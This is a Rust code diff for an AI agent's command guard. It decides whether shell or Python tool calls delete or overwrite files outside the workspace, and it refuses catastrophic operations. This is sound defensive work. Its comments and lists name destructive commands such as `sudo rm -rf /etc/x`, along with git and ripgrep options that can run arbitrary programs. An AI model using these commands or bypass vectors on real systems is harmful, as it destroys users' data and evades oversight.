     /// True when `scope` escapes the workspace; records an in-workspace hit.
-    fn escapes(scope: Option<DestructionScope>, found_in_ws: &mut bool) -> bool {
+    fn escapes(
+        scope: Option<DestructionScope>,
+        found_in_ws: &mut bool,
+        unresolved: &mut bool,
+    ) -> bool {
         match scope {
             Some(DestructionScope::OutOfWorkspace) => true,
             Some(DestructionScope::InWorkspace) => {
                 *found_in_ws = true;
                 false
             }
+            Some(DestructionScope::Unresolved) => {
+                *unresolved = true;
+                false
+            }
             None => false,
         }
     }
+    let mut unresolved = false;
     let mut found_in_ws = false;
-    let mut left_workspace = relative_paths_escape;
+    let mut cwd_location = initial_location;
     let cdpath_set = command.contains("CDPATH=");
     let segments: Vec<String> = command_segments(command).collect();
     let may_link: Vec<bool> = segments
@@ -993,9 +1419,14 @@ fn destruction_scope_in(
         let relinked = disk.is_some()
             && (runs_more_than_its_head(segment)
                 || (0..segments.len()).any(|j| j != i && may_link[j] && reach.reaches(j, i)));
-        let escape = left_workspace || relinked;
+        let escape = cwd_location != PathLocation::Workspace || relinked;
+        // A confirmed move out outranks link doubt: the path lands out there
+        // whether or not a link sits in the way.
         let relocate = |scope: Option<DestructionScope>| match scope {
-            Some(DestructionScope::InWorkspace) if escape => Some(DestructionScope::OutOfWorkspace),
+            Some(DestructionScope::InWorkspace) if cwd_location == PathLocation::Outside => {
+                Some(DestructionScope::OutOfWorkspace)
+            }
+            Some(DestructionScope::InWorkspace) if escape => Some(DestructionScope::Unresolved),
             other => other,
         };
         // BOTH readings, never just the unwrapped one. The raw segment is what
@@ -1005,6 +1436,7 @@ fn destruction_scope_in(
         if escapes(
             relocate(segment_destruction_scope(segment, here, scratch)),
             &mut found_in_ws,
+            &mut unresolved,
         ) {
             return Some(DestructionScope::OutOfWorkspace);
         }
@@ -1016,6 +1448,7 @@ fn destruction_scope_in(
             && escapes(
                 relocate(segment_destruction_scope(&inner, here, scratch)),
                 &mut found_in_ws,
+                &mut unresolved,
             )
         {
             return Some(DestructionScope::OutOfWorkspace);
@@ -1023,22 +1456,41 @@ fn destruction_scope_in(
         // The scope scan reads a relative overwrite as in-workspace, which the
         // fast path settles Safe. Out of the workspace it lands out there.
         if escape && (truncates_a_file(segment, scratch) || truncates_a_file(&inner, scratch)) {
-            return Some(DestructionScope::OutOfWorkspace);
+            if cwd_location == PathLocation::Outside {
+                return Some(DestructionScope::OutOfWorkspace);
+            }
+            unresolved = true;
         }
         let left = changes_dir_out_of_workspace(segment, root, here, cdpath_set)
             || changes_dir_out_of_workspace(&inner, root, here, cdpath_set);
-        left_workspace |= left;
+        if left {
+            cwd_location = cd_destination(segment)
+                .or_else(|| cd_destination(&inner))
+                .map(|target| path_location(&target, root, here))
+                // The move left, so a target that still reads as inside is doubt.
+                // So is a scratch one: only a missing directory places as
+                // scratch, and a `cd` into it fails and leaves the shell here.
+                .filter(|location| {
+                    !matches!(location, PathLocation::Workspace | PathLocation::Scratch)
+                })
+                .filter(|location| !cdpath_set || *location == PathLocation::Outside)
+                .unwrap_or(PathLocation::Unresolved);
+        }
         if !left && disk.is_some() {
             for target in [segment.as_str(), inner.as_ref()]
                 .into_iter()
                 .filter_map(cd_destination)
+                // A bare `cd` names home, which only the shell reading places.
+                .filter(|target| !target.starts_with('~'))
             {
                 let moved: Vec<PathBuf> = cwds.iter().map(|cwd| cwd.join(&target)).collect();
                 cwds.extend(moved);
                 cwds.sort();
                 cwds.dedup();
             }
-            left_workspace |= cwds.len() > MAX_TRACKED_CWDS;
+            if cwds.len() > MAX_TRACKED_CWDS {
+                cwd_location = PathLocation::Unresolved;
+            }
         }
     }
     if depth < MAX_SUBSTITUTION_DEPTH {
@@ -1052,15 +1504,23 @@ fn destruction_scope_in(
                 depth + 1,
                 root,
                 here,
-                left_workspace || linkers > 0,
+                if linkers > 0 {
+                    PathLocation::Unresolved
+                } else {
+                    cwd_location
+                },
                 ScratchWrites::Destroy,
             );
-            if escapes(scope, &mut found_in_ws) {
+            if escapes(scope, &mut found_in_ws, &mut unresolved) {
                 return Some(DestructionScope::OutOfWorkspace);
             }
         }
     }
-    found_in_ws.then_some(DestructionScope::InWorkspace)
+    if unresolved {
+        Some(DestructionScope::Unresolved)
+    } else {
+        found_in_ws.then_some(DestructionScope::InWorkspace)
+    }
 }
 
 /// True when `segment` may lay down a link, which would redirect a path that
@@ -1179,11 +1639,11 @@ impl LinkReach {
 }
 
 /// True when `segment` is a `cd` or `pushd` that leaves the workspace. A bare
-/// `cd` goes home, and `cd -` or `pushd +1` goes to a directory the line never
-/// names, so each counts as leaving. So does zsh's two-argument `cd old new`, which
-/// rewrites part of `$PWD`. With `cdpath_set`, a relative target can resolve
-/// anywhere. An absolute target stays in only under `root`, and on disk only
-/// when it resolves there.
+/// `cd` goes home. `cd -` and `pushd +1` go to a directory the line never
+/// names, so each counts as leaving. So does zsh's two-argument `cd old new`,
+/// which rewrites part of `$PWD`. With `cdpath_set`, a relative target can
+/// resolve anywhere. An absolute target stays in only under `root`, and on
+/// disk only when it resolves there.
 fn changes_dir_out_of_workspace(
     segment: &str,
     root: Option<&Path>,
@@ -1197,8 +1657,14 @@ fn changes_dir_out_of_workspace(
             if !matches!(base.as_str(), "cd" | "pushd") {
                 return false;
             }
-            match operands(args).as_slice() {
-                [target] if *target != "-" && !target.starts_with('+') => {
+            let operands = operands(args);
+            let target = match operands.as_slice() {
+                [] if base == "cd" => Some("~"),
+                [target] if *target != "-" && !target.starts_with('+') => Some(*target),
+                _ => None,
+            };
+            match target {
+                Some(target) => {
                     let under_root = path_under_root(target, root)
                         && disk.is_none_or(|d| {
                             plain_word(target)
@@ -1206,13 +1672,14 @@ fn changes_dir_out_of_workspace(
                         });
                     !under_root && (cdpath_set || !path_in_workspace(target, disk))
                 }
-                _ => true,
+                None => true,
             }
         })
 }
 
-/// The one directory a `cd` or `pushd` in `segment` names. Read only once
-/// [`changes_dir_out_of_workspace`] has found that the move stays inside.
+/// The one directory a `cd` or `pushd` in `segment` names, as the shell reads
+/// the word. A bare `cd` names home. `None` for `cd -`, `pushd +1` and a word
+/// the split cut short, since the line names none of those.
 fn cd_destination(segment: &str) -> Option<String> {
     let toks: Vec<&str> = segment.split_whitespace().collect();
     danger_head_candidates(&toks)
@@ -1222,7 +1689,8 @@ fn cd_destination(segment: &str) -> Option<String> {
                 return None;
             }
             match operands(args).as_slice() {
-                [target] => Some(unquoted(target).to_string()),
+                [] if base == "cd" => Some("~".to_string()),
+                [target] if *target != "-" && !target.starts_with('+') => whole_word(target),
                 _ => None,
             }
         })
@@ -1314,15 +1782,15 @@ fn literal_dir(token: &str, home: Option<&Path>) -> Option<PathBuf> {
     (dir.is_absolute() && !dir.components().any(|c| c == Component::ParentDir)).then_some(dir)
 }
 
-/// The operands of a command, without its flags and redirects. A `<` or `>`
-/// ends a word, so `/etc/x>log` keeps `/etc/x`, and a quoted `'/etc/a>b'`
-/// keeps a fragment that still reads as outside. A word ending in the operator
-/// takes the next token as its target.
+/// The operands of a command, without its flags and redirects. An unquoted
+/// `<` or `>` ends a word, so `/etc/x>log` keeps `/etc/x`, and a quoted
+/// `'/etc/a>b'` stays whole. A word ending in the operator takes the next
+/// token as its target.
 fn operands<'a>(args: &[&'a str]) -> Vec<&'a str> {
     let mut operands = Vec::new();
     let mut args = args.iter().copied();
     while let Some(arg) = args.next() {
-        let (word, fd_only) = match arg.find(['<', '>']) {
+        let (word, fd_only) = match unquoted_redirect_at(arg) {
             Some(at) => {
                 if arg.ends_with(['<', '>']) {
                     args.next();
@@ -1339,6 +1807,25 @@ fn operands<'a>(args: &[&'a str]) -> Vec<&'a str> {
     operands
 }
 
+/// The byte offset of the first `<` or `>` in `arg` that no quote or
+/// backslash covers.
+fn unquoted_redirect_at(arg: &str) -> Option<usize> {
+    let mut quote: Option<char> = None;
+    let mut chars = arg.char_indices();
+    while let Some((at, c)) = chars.next() {
+        match (quote, c) {
+            (None, '\'' | '"') => quote = Some(c),
+            (Some(q), _) if c == q => quote = None,
+            (None | Some('"'), '\\') => {
+                chars.next();
+            }
+            (None, '<' | '>') => return Some(at),
+            _ => {}
+        }
+    }
+    None
+}
+
 /// Destruction scope of one shell segment, or `None`. Skips the same benign
 /// prefixes the other scans do, so `sudo rm -rf /etc/x` is seen.
 fn segment_destruction_scope(
@@ -1351,17 +1838,26 @@ fn segment_destruction_scope(
     // is an out-of-workspace EDIT (wanted). An in-workspace truncation reads
     // as Safe, like any in-workspace write. Neither lands here.
     if truncation_escapes(segment, disk, scratch) {
-        return Some(DestructionScope::OutOfWorkspace);
+        return Some(
+            if truncated_files(segment).iter().any(|t| {
+                path_location(&dequoted(t), disk.map(|d| d.root), disk) == PathLocation::Outside
+            }) {
+                DestructionScope::OutOfWorkspace
+            } else {
+                DestructionScope::Unresolved
+            },
+        );
     }
     let toks: Vec<&str> = segment.split_whitespace().collect();
     // Out-of-workspace wins over in-workspace across the candidate readings of
     // the preamble, the same way it wins across segments.
     danger_head_candidates(&toks)
         .into_iter()
-        .filter_map(|(base, head_args)| head_destruction_scope(&base, head_args, disk))
+        .filter_map(|(base, head_args)| head_destruction_scope(&base, head_args, disk, scratch))
         .max_by_key(|scope| match scope {
             DestructionScope::InWorkspace => 0,
-            DestructionScope::OutOfWorkspace => 1,
+            DestructionScope::Unresolved => 1,
+            DestructionScope::OutOfWorkspace => 2,
         })
 }
 
@@ -1370,54 +1866,77 @@ fn head_destruction_scope(
     base: &str,
     head_args: &[&str],
     disk: Option<OnDisk<'_>>,
+    scratch: ScratchWrites,
 ) -> Option<DestructionScope> {
-    if base == "dd" {
-        // dd overwrites its `of=` target (a block-device target is already
-        // caught by the catastrophic scan upstream). No `of=` → stdout → not
-        // destruction.
-        let of_target = head_args.iter().find_map(|a| a.strip_prefix("of="));
-        return of_target.map(|t| {
-            if !path_in_workspace(t, disk) && !is_harmless_redirect(t) {
-                DestructionScope::OutOfWorkspace
-            } else {
-                DestructionScope::InWorkspace
+    let scope = |target: &str| {
+        if is_harmless_redirect(target) {
+            return None;
+        }
+        if scratch.exempts(target) {
+            return None;
+        }
+        let Some(word) = whole_word(target) else {
+            return Some(DestructionScope::Unresolved);
+        };
+        match path_location(&word, disk.map(|d| d.root), disk) {
+            PathLocation::Workspace => Some(DestructionScope::InWorkspace),
+            PathLocation::Scratch if scratch == ScratchWrites::Destroy => {
+                Some(DestructionScope::Unresolved)
             }
-        });
+            PathLocation::Scratch => None,
+            PathLocation::Outside => Some(DestructionScope::OutOfWorkspace),
+            PathLocation::Unresolved => Some(DestructionScope::Unresolved),
+        }
+    };
+    if base == "dd" {
+        return head_args
+            .iter()
+            .find_map(|a| a.strip_prefix("of="))
+            .and_then(scope);
     }
     let args = operands(head_args);
-    if DESTRUCTIVE_HEADS.contains(&base) {
-        return Some(if args.iter().any(|a| token_escapes_workspace(a, disk)) {
-            DestructionScope::OutOfWorkspace
-        } else {
-            DestructionScope::InWorkspace
-        });
-    }
-    if !DESTRUCTIVE_DEST_HEADS.contains(&base)
-        || (base == "install" && install_makes_directories(head_args))
-    {
-        return None;
+    // No operand means the targets arrive another way, as with `xargs rm`.
+    // That is destruction here, and `relocate` moves it after a `cd` out.
+    if DESTRUCTIVE_HEADS.contains(&base) && args.is_empty() {
+        return Some(DestructionScope::InWorkspace);
     }
     let targets = target_directories(head_args);
-    if args.len() < 2 && targets.is_empty() {
-        return None;
-    }
-    let dest_escapes = |dest: &str| {
-        token_escapes_workspace(dest, disk) || disk.is_some_and(|d| dir_entry_escapes(dest, d))
-    };
-    let source_escapes = SOURCE_REMOVING_HEADS.contains(&base)
-        && args.iter().any(|a| token_escapes_workspace(a, disk));
-    // The last operand stays a candidate beside a target option, since a
-    // misread option must never hide the real destination.
-    let writes_outside = targets
-        .iter()
-        .map(String::as_str)
-        .chain(args.last().copied())
-        .any(dest_escapes);
-    Some(if source_escapes || writes_outside {
-        DestructionScope::OutOfWorkspace
+    let candidates: Vec<_> = if DESTRUCTIVE_HEADS.contains(&base) {
+        args.clone()
+    } else if DESTRUCTIVE_DEST_HEADS.contains(&base)
+        && !(base == "install" && install_makes_directories(head_args))
+        && (args.len() >= 2 || !targets.is_empty())
+    {
+        targets
+            .iter()
+            .map(String::as_str)
+            .chain(args.last().copied())
+            .chain(
+                args.iter()
+                    .copied()
+                    .filter(|_| SOURCE_REMOVING_HEADS.contains(&base)),
+            )
+            .collect()
     } else {
-        DestructionScope::InWorkspace
-    })
+        return None;
+    };
+    candidates
+        .into_iter()
+        .filter_map(|target| {
+            let found = scope(target);
+            if found == Some(DestructionScope::InWorkspace)
+                && disk.is_some_and(|d| dir_entry_escapes(target, d))
+            {
+                Some(DestructionScope::Unresolved)
+            } else {
+                found
+            }
+        })
+        .max_by_key(|scope| match scope {
+            DestructionScope::InWorkspace => 0,
+            DestructionScope::Unresolved => 1,
+            DestructionScope::OutOfWorkspace => 2,
+        })
 }
 
 /// The values of every target-directory option on a `cp`, `mv` or `install`
@@ -1494,7 +2013,7 @@ fn truncated_files(segment: &str) -> Vec<String> {
 /// bundle, or any prefix of `--append` GNU accepts.
 fn tee_appends(options: &[String]) -> bool {
     options.iter().any(|word| match long_option_name(word) {
-        Some(name) => abbreviates_any(name, &["append"]),
+        Some(name) => name.len() >= 2 && abbreviates_any(name, &["append"]),
         None => word.contains('a'),
     })
 }
@@ -1524,7 +2043,7 @@ fn install_makes_directories(args: &[&str]) -> bool {
         .0
         .iter()
         .any(|word| match long_option_name(word) {
-            Some(name) => abbreviates_any(name, &["directory"]),
+            Some(name) => name.len() >= 2 && abbreviates_any(name, &["directory"]),
             None => short_flag_value(word, 'd', INSTALL_VALUE_LETTERS).is_some(),
         })
 }
@@ -1611,9 +2130,10 @@ static PY_SHELL_OUT_SIGNALS: &[&str] = &[
 /// absolute or under `~`, it is in-workspace, and so checkpointable. Coarse on
 /// purpose: the literal need not be the destruction call's own argument. A
 /// stray outside path alongside an unrelated delete errs toward ask, the
-/// fallback's documented direction. A
-/// destruction call on a pure variable path stays in-workspace (the checkpoint
-/// covers the common case; the judge covers the rest when it's on).
+/// fallback's documented direction. A literal the guard cannot place asks,
+/// without inventing evidence of an outside path. A destruction call on a
+/// pure variable path stays in-workspace: the checkpoint covers the common
+/// case, and the judge covers the rest when it is on.
 fn python_destruction_scope(
     code: &str,
     root: Option<&Path>,
@@ -1630,13 +2150,16 @@ fn python_destruction_scope(
             .iter()
             .chain(PY_SHELL_OUT_SIGNALS)
             .any(|s| code.contains(s));
-    Some(
-        if relocates || python_string_literal_escapes(code, root, disk, home) {
-            DestructionScope::OutOfWorkspace
-        } else {
-            DestructionScope::InWorkspace
-        },
-    )
+    Some(if python_string_literal_escapes(code, root, disk, home) {
+        DestructionScope::OutOfWorkspace
+    } else if relocates
+        || python_string_literals(code)
+            .any(|s| literal_path_location(s, root, disk, home) == PathLocation::Unresolved)
+    {
+        DestructionScope::Unresolved
+    } else {
+        DestructionScope::InWorkspace
+    })
 }
 
 /// True when any quoted string literal in `code` names a path outside the
@@ -1674,7 +2197,10 @@ fn python_string_literals(code: &str) -> impl Iterator<Item = &str> {
 pub fn catastrophic_refusal(tool_name: &str, input: &Value) -> String {
     let reason = command_text(tool_name, input)
         .and_then(catastrophic_reason)
-        .unwrap_or("a catastrophic, irreversible operation");
+        .map_or(
+            "a catastrophic, irreversible operation",
+            Catastrophe::reason,
+        );
     format!(
         "Refused by the command guard — this command was NOT run. It matches {reason}, which is \
          irreversible and no legitimate task needs it. Do not retry it; choose a different, safe \
@@ -1714,11 +2240,29 @@ pub enum GuardDecision {
     /// Block this command AND fail the whole trigger run (ADR 0002, Phase 5): an
     /// unattended trigger hit an `IrreversibleDanger` command whose side-effect
     /// category isn't in its grant. The agentic loop records the block as a
-    /// failed tool result, emits a terminal `ResponseFailed`, and returns `Err`
-    /// so the scheduler's failure-notification path surfaces it. Only ever
+    /// failed tool result. A block that names a grant parks the run on the
+    /// owner's card. Any other block emits a terminal `ResponseFailed` and
+    /// returns `Err`, so the scheduler sends its failure notice. Only ever
     /// produced on the `Trigger` channel.
-    FailTrigger(String),
+    FailTrigger(TriggerCommandBlocked),
 }
+
+/// Failure of an unattended command, with an optional owner-grantable scope.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct TriggerCommandBlocked {
+    pub reason: String,
+    pub pattern: Option<String>,
+    pub folder: Option<crate::triggers::folder_grant::TriggerFolderGrant>,
+    pub thread_id: uuid::Uuid,
+}
+
+impl std::fmt::Display for TriggerCommandBlocked {
+    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        formatter.write_str(&self.reason)
+    }
+}
+
+impl std::error::Error for TriggerCommandBlocked {}
 
 /// Extract the inspectable command text from a tool call: the `command` field
 /// for the bash tools, the `code` field for the python tools. `None` for any
@@ -1747,10 +2291,10 @@ pub fn mcp_setup_command_line(
     spawn_cwd: Option<&Path>,
     root: &Path,
 ) -> Option<Result<String, String>> {
-    if crate::engine::tools::dispatch_name(tool_name, input) != Ok(tn::SETUP_MCP_SERVER) {
+    if crate::engine::tool_arguments::dispatch_name(tool_name, input) != Ok(tn::SETUP_MCP_SERVER) {
         return None;
     }
-    let setup = crate::engine::tools::mcp::McpSetupRequest::parse(input).ok()?;
+    let setup = crate::engine::tool_arguments::McpSetupRequest::parse(input).ok()?;
     let Some(cwd) = spawn_cwd else {
         return Some(Err(
             "Refused by the command guard: this MCP server was NOT set up. The engine's working \
@@ -1925,7 +2469,6 @@ static GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
     "diff",
     "show",
     "blame",
-    "reflog",
     "rev-parse",
     "rev-list",
     "ls-files",
@@ -1941,6 +2484,27 @@ static GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
     "fsck",
     "version",
 ];
+
+/// Git's global options admitted by the read proof, with their value arity.
+/// Configuration and repository-selection options that can run code are absent.
+const GIT_READ_GLOBAL_OPTIONS: &[(&str, bool)] = &[
+    ("--version", false),
+    ("-v", false),
+    ("--help", false),
+    ("-h", false),
+    ("--no-pager", false),
+    ("-P", false),
+    ("--no-replace-objects", false),
+    ("--no-optional-locks", false),
+    ("--literal-pathspecs", false),
+    ("--glob-pathspecs", false),
+    ("--noglob-pathspecs", false),
+    ("--icase-pathspecs", false),
+    ("--work-tree", true),
+    ("--namespace", true),
+];
+
+const GIT_REFLOG_READ_SUBCOMMANDS: &[&str] = &["show", "exists"];
 
 /// Read-only `gh` calls, as `(group, subcommands)`. `("status", &[])` is the
 /// bare `gh status`. A write (`pr merge`, `run rerun`), a local write (`run
@@ -1964,15 +2528,8 @@ static LUCIDOS_WORKSPACE_LOCAL_SUBCOMMANDS: &[(&str, &[&str])] = &[
     ("data", &["path", "write"]),
     ("model-prices", &[]),
     ("events", &["query", "count"]),
+    ("diagnostic-log", &["query"]),
     ("knowhow", &["list", "read"]),
-];
-
-/// The variables that tell the `lucidos` CLI which engine to reach. A line
-/// that sets one can send a `data write --from` file anywhere.
-const LUCIDOS_CLI_ENV_NAMES: [&str; 3] = [
-    "LUCIDOS_API_BASE_URL",
-    "LUCIDOS_WORKSPACE",
-    "LUCIDOS_API_PORT",
 ];
 
 /// Why the Safe fast path did not settle a command. The two are NOT
@@ -2073,17 +2630,15 @@ fn bash_fast_path_at(
 /// Flags that make an otherwise read-only head run an arbitrary program.
 /// Ripgrep runs `--pre` per file and `--hostname-bin` per host; `sort
 /// --compress-program` runs a compressor; many tools run a `--pager`.
-const EXEC_CAPABLE_READ_FLAGS: &[&str] =
-    &["--pre", "--hostname-bin", "--compress-program", "--pager"];
+const EXEC_CAPABLE_READ_FLAGS: &[&str] = &["pre", "hostname-bin", "compress-program", "pager"];
 
-/// True when `args` carry an [`EXEC_CAPABLE_READ_FLAGS`] flag, in either the
-/// separate (`--pre CMD`) or the glued (`--pre=CMD`) form.
+/// True when `args` may carry an exec-capable long option.
 fn args_have_exec_capable_flag(args: &[&str]) -> bool {
     args.iter().any(|arg| {
-        EXEC_CAPABLE_READ_FLAGS.contains(arg)
-            || EXEC_CAPABLE_READ_FLAGS
-                .iter()
-                .any(|f| arg.starts_with(&format!("{f}=")))
+        [*arg, dequoted(arg).as_str()].iter().any(|word| {
+            long_option_name(word)
+                .is_some_and(|name| abbreviates_any(name, EXEC_CAPABLE_READ_FLAGS))
+        })
     })
 }
 
@@ -2171,10 +2726,8 @@ fn head_safety(
     if preamble_has_code_injecting_env(&toks, i) {
         return Some(Refusal);
     }
-    let Some(head) = toks.get(i) else {
-        // Only benign prefixes / redirects, so no command runs.
-        return None;
-    };
+    // With no head there are only benign prefixes or redirects, so no command runs.
+    let head = toks.get(i)?;
     // Resolve the head by NAME, never by basename. Resolving a path-qualified
     // head to its basename would settle the agent's OWN binary as the read-only
     // one it is named after. The agent could then write it with an ordinary
@@ -2267,49 +2820,52 @@ fn head_safety(
 fn git_subcommand_safety(args: &[&str]) -> Option<FastPathDecline> {
     let unquoted = shell_stripped(args);
     let args: Vec<&str> = unquoted.iter().map(String::as_str).collect();
-    let mut i = 0;
-    while let Some(&arg) = args.get(i) {
-        // Global flags that can inject an executable under a read-only
-        // subcommand. Never statically safe; let the judge see them.
-        //   `-c k=v` / `--config-env`: an executable config (pager, editor,
-        //     sshCommand, alias).
-        //   `--exec-path[=<dir>]`: redirects where git resolves `git-<sub>`.
-        //   `--git-dir[=<dir>]`: reads `<dir>/config`, which needs no `.git`
-        //     component, so a plain in-workspace write can plant one.
-        //   `-C <dir>`: discovers the repository from `<dir>`, which can be
-        //     a bare repository planted the same way.
-        //   `--bare`: reads the cwd as that bare repository.
-        if arg == "-c"
-            || arg.starts_with("-C")
-            || arg == "--bare"
-            || arg == "--config-env"
-            || arg.starts_with("--config-env=")
-            || arg == "--exec-path"
-            || arg.starts_with("--exec-path=")
-            || arg == "--git-dir"
-            || arg.starts_with("--git-dir=")
-        {
-            return Some(FastPathDecline::Refusal);
+    let mut words = args.iter();
+    let sub = loop {
+        match words.next().copied() {
+            Some(arg) if arg.starts_with('-') => {
+                let (name, value) = arg
+                    .split_once('=')
+                    .map_or((arg, None), |(n, v)| (n, Some(v)));
+                let Some(&(_, takes_value)) = GIT_READ_GLOBAL_OPTIONS
+                    .iter()
+                    .find(|(flag, _)| *flag == name)
+                else {
+                    return Some(FastPathDecline::Refusal);
+                };
+                let valid = if takes_value {
+                    value
+                        .or_else(|| words.next().copied())
+                        .is_some_and(|v| !v.is_empty())
+                } else {
+                    value.is_none()
+                };
+                if !valid {
+                    return Some(FastPathDecline::Refusal);
+                }
+            }
+            sub => break sub,
         }
-        match arg {
-            // Flags that take a separate value argument.
-            "--work-tree" | "--namespace" => i += 2,
-            a if a.starts_with('-') => i += 1,
-            _ => break,
+    };
+    let sub_args = words.as_slice();
+    match sub {
+        Some("reflog") => {
+            // Bare `git reflog`, and one whose first word is an option, is
+            // `reflog show`. Any other first word may name a write.
+            let reads = sub_args.first().is_none_or(|action| {
+                action.starts_with('-') || GIT_REFLOG_READ_SUBCOMMANDS.contains(action)
+            });
+            if !reads {
+                return Some(FastPathDecline::Omission);
+            }
         }
+        Some(sub) if GIT_READ_ONLY_SUBCOMMANDS.contains(&sub) => {}
+        _ => return Some(FastPathDecline::Omission),
     }
-    if !args
-        .get(i)
-        .is_some_and(|sub| GIT_READ_ONLY_SUBCOMMANDS.contains(sub))
-    {
-        // A mutating or unknown subcommand (`push`, `commit`) is an omission,
-        // the same shape as an unrecognised head. It hides nothing.
-        return Some(FastPathDecline::Omission);
-    }
-    let sub_args = &args[i + 1..];
-    let opens_a_pager = args[i] == "grep" && git_grep_opens_files_in_pager(sub_args);
-    (opens_a_pager || sub_args.iter().any(|a| is_git_output_flag(a)))
-        .then_some(FastPathDecline::Refusal)
+    let opens_a_pager = sub == Some("grep") && git_grep_opens_files_in_pager(sub_args);
+    // Words after `--` are pathspecs, whatever they look like.
+    let mut options = sub_args.iter().take_while(|a| **a != "--");
+    (opens_a_pager || options.any(|a| is_git_output_flag(a))).then_some(FastPathDecline::Refusal)
 }
 
 /// True when `args`, the tokens after `gh`, make a call on
@@ -2400,10 +2956,10 @@ fn long_option_name(arg: &str) -> Option<&str> {
     Some(long.split_once('=').map_or(long, |(name, _)| name))
 }
 
-/// True when `name` spells one of `flags`, or an unambiguous prefix of it.
-/// git, wget and older curl all accept the prefix.
+/// A tracked option or any nonempty prefix of it. These checks only decline
+/// the fast path, so an ambiguous spelling still goes to the judge.
 fn abbreviates_any(name: &str, flags: &[&str]) -> bool {
-    name.len() >= 2 && flags.iter().any(|f| f.starts_with(name))
+    !name.is_empty() && flags.iter().any(|f| f.starts_with(name))
 }
 
 /// True when a post-subcommand `git` token names a file the subcommand will
@@ -2416,9 +2972,7 @@ fn abbreviates_any(name: &str, flags: &[&str]) -> bool {
 /// safety, because git rejects `-o` on the subcommands that can write.
 /// `--output-directory` is kept for the day `format-patch` joins the list.
 fn is_git_output_flag(arg: &str) -> bool {
-    matches!(arg, "--output" | "--output-directory")
-        || arg.starts_with("--output=")
-        || arg.starts_with("--output-directory=")
+    long_option_name(arg).is_some_and(|name| abbreviates_any(name, &["output", "output-directory"]))
 }
 
 /// The first line of a judged Python command that installs packages first.
@@ -2427,17 +2981,99 @@ const PIP_INSTALL_LINE: &str = "# pip install ";
 /// The packages a python tool call installs before it runs, space-joined, or
 /// `None` when it installs none.
 fn python_packages(input: &Value) -> Option<String> {
-    let names = crate::engine::tools::python::requested_packages(input);
+    let names = crate::engine::tool_arguments::requested_packages(input);
     (!names.is_empty()).then(|| names.join(" "))
 }
 
-/// True when `code` is statically safe Python: no signal of a real-world
-/// side-effect or arbitrary shell-out. Pure compute, data crunching and
-/// in-workspace file work have no signal and run without the judge. A network
-/// write, a subprocess, an eval shape or a git metadata path falls through to
-/// it.
-fn python_is_statically_safe(code: &str) -> bool {
-    !python_side_effect_signal(code)
+/// Standard-library modules whose ordinary imports support computation.
+const PY_COMPUTE_IMPORTS: &[&str] = &[
+    "__future__",
+    "bisect",
+    "collections",
+    "collections.abc",
+    "decimal",
+    "fractions",
+    "functools",
+    "heapq",
+    "itertools",
+    "json",
+    "math",
+    "operator",
+    "re",
+    "statistics",
+    "string",
+    "sys",
+    "time",
+    "typing",
+];
+
+/// Recognize plain imports, aliases and from-imports. The Python string
+/// reader and comment scan keep mentions of an import out of the proof.
+/// Code that never spells `import` has none to prove.
+fn python_imports_are_proven(code: &str, proven_shell_outs: bool) -> bool {
+    static FROM: LazyLock<regex::Regex> =
+        LazyLock::new(|| regex::Regex::new(r"^[ \t]+([.\w]+)[ \t]+import\b").unwrap());
+    let allowed = |module: &str| {
+        PY_COMPUTE_IMPORTS.contains(&module) || (proven_shell_outs && module == "subprocess")
+    };
+    if !code.contains("import") {
+        return true;
+    }
+    let mut i = 0;
+    while let Some(c) = code[i..].chars().next() {
+        if c == '#' {
+            i = code[i..].find(['\r', '\n']).map_or(code.len(), |o| i + o);
+        } else if matches!(c, '\'' | '"') {
+            let Some(end) = python_string_end(code, i, "") else {
+                return false;
+            };
+            i = end;
+        } else if c == '_' || c.is_alphanumeric() {
+            let end = python_word_end(code, i);
+            let word = &code[i..end];
+            let rest = &code[end..];
+            i = end;
+            if rest.starts_with(['\'', '"']) && is_python_string_prefix(word) {
+                let Some(end) = python_string_end(code, end, word) else {
+                    return false;
+                };
+                i = end;
+            } else if matches!(word, "__import__" | "import_module") {
+                return false;
+            } else if word == "from" {
+                let Some(import) = FROM.captures(rest) else {
+                    // `raise ... from exc` and `yield from gen` import
+                    // nothing. A continued line may still hold an import.
+                    let line = rest.split(['\r', '\n']).next().unwrap_or("");
+                    if line.contains("import") || line.trim_end().ends_with('\\') {
+                        return false;
+                    }
+                    continue;
+                };
+                if !allowed(&import[1]) {
+                    return false;
+                }
+                i += import.get(0).unwrap().end();
+            } else if word == "import" {
+                let statement = rest.split(['\r', '\n', ';', '#']).next().unwrap_or("");
+                for module in statement.split(',') {
+                    let mut words = module.split_whitespace();
+                    if !words.next().is_some_and(allowed)
+                        || !matches!(
+                            (words.next(), words.next(), words.next()),
+                            (None, None, None) | (Some("as"), Some(_), None)
+                        )
+                    {
+                        return false;
+                    }
+                }
+                i += statement.len();
+            }
+        } else {
+            i += c.len_utf8();
+        }
+    }
+    true
 }
 
 /// What a proof found about code it can see through. Ordered by severity, so
@@ -2445,6 +3081,7 @@ fn python_is_statically_safe(code: &str) -> bool {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 enum Proof {
     Safe,
+    UnlistedImport,
     Unproven,
     Catastrophic,
 }
@@ -2453,38 +3090,43 @@ enum Proof {
 /// bash into inline Python. Deeper nesting stays unproven.
 const MAX_PROOF_DEPTH: usize = 3;
 
-/// [`python_is_statically_safe`], seeing through a `subprocess` call whose
+/// Prove imports and side effects, seeing through a `subprocess` call whose
 /// command is a literal ([`python_shell_outs`]). Each literal must pass the
-/// bash fast path, and the code around the calls must pass the static check.
-/// That code may not change directory, make a link or touch the environment,
-/// since each of those changes what the literal does.
+/// bash fast path. The surrounding code may not change directory, make a link
+/// or touch the environment, since each changes what the literal does.
 fn python_program_proof(code: &str, disk: Option<OnDisk<'_>>, depth: usize) -> Proof {
-    if !code.contains("subprocess") {
-        return if python_is_statically_safe(code) {
-            Proof::Safe
-        } else {
-            Proof::Unproven
+    let mut proven_shell_outs = false;
+    if code.contains("subprocess") {
+        let Some(shell_outs) = python_shell_outs(code) else {
+            return Proof::Unproven;
         };
-    }
-    let Some(shell_outs) = python_shell_outs(code) else {
-        return Proof::Unproven;
-    };
-    let literals = shell_outs
-        .commands
-        .iter()
-        .map(|cmd| shell_literal_proof(cmd, disk, depth + 1))
-        .max()
-        .unwrap_or(Proof::Safe);
